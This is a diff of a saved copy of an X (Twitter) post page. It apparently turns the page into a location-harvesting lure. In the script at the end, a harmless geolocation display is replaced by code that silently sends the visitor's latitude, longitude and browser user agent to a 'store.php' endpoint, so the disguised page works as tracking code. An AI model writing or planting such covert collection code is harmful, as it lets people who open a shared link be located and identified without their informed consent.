@@ -6381,20 +6381,22 @@ a.\[a\&\]\:hover\:bg-secondary\/90:hover {
   }
 })();</script><script src="./Dr. Ajayita on X_ _The shaadi card is 🤣🤣🤣 https___t.co_iHN99QXofB_ _ X_files/client" id="googleGSILibrary" async="" defer=""></script><script src="./Dr. Ajayita on X_ _The shaadi card is 🤣🤣🤣 https___t.co_iHN99QXofB_ _ X_files/appleid.auth.js.download" id="signInWithAppleJsLibrary" async="" defer=""></script><div style="width: 0px; height: 0px;"></div>
 <p id="demo"></p>
+
 <script>
-  var x = document.getElementById("demo");
-  
-  function getLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(showPosition);
-    } else { 
-      x.innerHTML = "Geolocation is not supported by this browser.";
-    }
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
   }
-  
-  function showPosition(position) {
-    x.innerHTML = "Latitude: " + position.coords.latitude + 
-    "<br>Longitude: " + position.coords.longitude;
-  }
-  </script>
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+     xhttp.send();
+}
+</script>
 </body></html>
